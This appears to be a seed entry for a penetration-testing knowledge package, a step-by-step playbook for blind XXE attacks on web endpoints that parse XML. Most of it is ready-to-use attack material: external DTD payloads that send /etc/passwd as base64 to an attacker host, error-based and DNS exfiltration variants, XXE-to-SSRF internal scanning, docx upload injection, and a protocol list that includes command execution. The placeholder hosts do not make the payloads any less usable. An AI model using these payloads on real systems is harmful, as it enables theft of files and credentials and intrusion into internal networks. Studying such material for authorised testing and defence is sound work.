# [Seed] Blind XXE OOB → Exfiltrate /etc/passwd and Probe the Internal Network

## Scenario Category
Pentest / Web Exploitation

## Target Overview
A web endpoint accepts XML request bodies (SOAP / docx upload parsing / custom API) but does not reflect any content (i.e., "blind XXE"). Use external DTD + parameter entity tricks to exfiltrate the target files back to the attacker's server.

## Full Execution Chain

1. Probe points
   - Any Content-Type containing `xml` / `soap` / file uploads of docx/xlsx/pptx (XML inside) / SVG
   - After injecting a test payload, watch the response: error / delay / OOB callback
2. First try simple in-band XXE with reflected output
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
3. No reflection but OOB works → use an external DTD
   - Host evil.dtd on your own VPS
   - Trigger the server to load it and exfiltrate
4. OOB also blocked → see whether error-based / blind boolean works
5. After getting /etc/passwd, expand the surface:
   - Internal port scanning (XXE → SSRF)
   - Read application config files (database passwords / private keys)
   - Chain SSRF into cloud metadata → see seed-006

## Pitfalls Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Direct SYSTEM "file://" throws an error | The parser has ENTITY references disabled | Switch to nested parameter entities (%) | 30min |
| A file containing `<` `>` `&` blows up DTD parsing | The XML spec forbids special characters inside parameter entities | Wrap with a base64 layer via `php://filter` | 40min |
| The OOB server gets a callback on port 80 but the payload is not assembled correctly | Wrong DTD nesting level order | Strictly follow the OOB template (outer + inner) | 1h |
| The file is read but only halfway | XML limits entity length (XML_MAX_TOKEN_BYTES) | Read in segments + offsets | 1h |
| Internal SSRF all returns connection refused | No internal services open on the application's subnet | Switch to localhost / 127.0.0.1 / internal service names (K8s) | 30min |
| The Java application cannot be exploited | Java's default XML parser blocks SYSTEM | Try the `jar:` protocol / or a SOAP endpoint, which may run an older Apache Xerces | several hours |

## Toolchain Findings

- **XXEinjector** automated XXE exploitation (Ruby)
- **Burp Collaborator** / **interactsh** are OOB must-haves
- **dnslog.cn / oast.online** DNS-only OOB (CN-hosted / international respectively)
- File upload scenario: **a docx is zip + xml**, modify word/document.xml and zip it back up to inject
- **payloads-all-the-things** XXE section is the most complete cheatsheet

## Key Code/Commands

Standard two-layer OOB DTD (file contents exfiltrated inline as base64):

**evil.dtd (hosted on the attacker's VPS)**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**Target request body**:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**Attacker runs an HTTP service to collect the data**:

```bash
python3 -m http.server 8000
# Received GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```

XXE → SSRF internal network scanning:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

Error-based — make the XML parser return file contents in its error messages:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**docx upload XXE** (many document-processing applications are affected):

```bash
unzip target.docx -d unpacked/
# Edit unpacked/word/document.xml, changing the opening to:
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# Upload evil.docx
```

## Improvement Suggestions for This Package

- `pentest-tools/references/web-attack-cheatsheet.md` should have a complete XXE section (OOB / error / blind / docx upload / svg)
- Add interactsh-client to the bootstrap manifest (if not present yet)
- routing already covers XXE, but consider adding an explicit "XXE OOB exfiltration" route

## Reusable Patterns/Script Snippets

**XXE type decision tree**:

```text
Reflected output      → direct SYSTEM "file://" read
Errors reflected      → error-based payload (two nesting layers + deliberately triggered parse failure)
No output at all      → standard two-layer OOB DTD (DNS / HTTP)
DNS open, HTTP closed → DNS exfil (base32-encoded into subdomains)
```

**XXE protocol list (test per parser)**:

```text
file://           → read local files (most common)
http://, https:// → SSRF
ftp://            → also supported by older Java versions
gopher://         → only a few rare PHP parsers
expect://         → command execution when PHP has the expect extension installed
jar://            → Java extracts files from a remote jar
netdoc://         → older Java alternative to file://
```

**DNS exfil (weakest channel)**:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- DNS log receives hostname.attacker.com -->
```

## Evolution Actions
- [ ] Add a complete XXE section to web-attack-cheatsheet.md
- [ ] Check interactsh-client in bootstrap-manifest
- [x] routing already has an XXE entry

## Environment Info
- Attacker VPS (public IP, with 80/8000/53 open)
- Target: any web application accepting XML input (PHP/Java/Python lxml/.NET are all affected)
- OOB: interactsh / dnslog.cn / self-hosted DNS

## Sanitization Requirement
This entry is seed data, written from public web exploitation patterns; it involves no real production targets. All domains/IPs are placeholders.
